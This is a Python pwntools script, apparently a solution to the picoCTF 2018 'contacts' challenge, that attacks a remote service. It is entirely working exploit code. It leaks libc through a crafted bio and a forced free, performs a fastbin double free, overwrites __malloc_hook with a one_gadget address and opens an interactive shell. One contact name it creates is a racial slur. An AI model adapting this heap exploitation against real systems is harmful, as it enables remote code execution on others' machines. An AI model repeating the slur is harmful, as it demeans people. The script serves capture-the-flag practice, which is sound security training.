from pwn import *

libc = ELF('./libc.so.6')

p = remote('2018shell.picoctf.com', 59572)
# p = process('./contacts')
strdup_plt = 0x602040

libc_system = libc.symbols['system']
libc_strdup = libc.symbols['strdup']
libc_bin_sh = 0x18cd57
malloc_hook_offset = 0x3c4aed 
one_gadget_offset = 0x4526a

def createContact(name):
	p.recvuntil('command:')
	p.sendline('create ' + name)

def displayContacts():
	p.recvuntil('command:')
	p.sendline('display')

def deleteContact(name):
	p.recvuntil('command:')
	p.sendline('delete ' + name)

def addBio(name, size, bio):
	p.recvuntil('command:')
	p.sendline('bio ' + name)
	p.recvuntil('be?')
	p.sendline(str(size))
	p.recvuntil('bio:')
	p.sendline(bio)

def fakeFree(name):
	p.recvuntil('command:')
	p.sendline('bio ' + name)
	p.recvuntil('be?')
	p.sendline('400')


createContact('joel')
createContact('lolo')
addBio('lolo', 20, 'AAAABBBB'+ p64(strdup_plt))

fakeFree('lolo')

createContact('nigga')
displayContacts()

p.recv(1024)
leak = p.recvuntil('\x7f')
heap_address = leak[70:74] + '\x00'*4
strdup_addr = u64(leak[83:89] + '\x00\x00')

libc_base = strdup_addr - libc_strdup
system_addr = libc_base + libc_system
binsh_addr = libc_base + libc_bin_sh
malloc_hook_addr = libc_base + malloc_hook_offset
one_gadget = libc_base + one_gadget_offset

createContact('kill')
createContact('hoop')
createContact('loop')
createContact('bull')
createContact('nill')
createContact('poop')

addBio('kill', 0x60, 'A'*0x59)
addBio('hoop', 0x60, 'B'*0x59)

fakeFree('kill')
fakeFree('hoop')
fakeFree('kill')

addBio('loop', 0x60, p64(malloc_hook_addr))

addBio('poop', 0x60, 'C'*0x59)

addBio('nill', 0x60, 'D'*0x59)

addBio('bull', 0x60, 'E'*19 + p64(one_gadget))

createContact('pwned')

p.interactive()


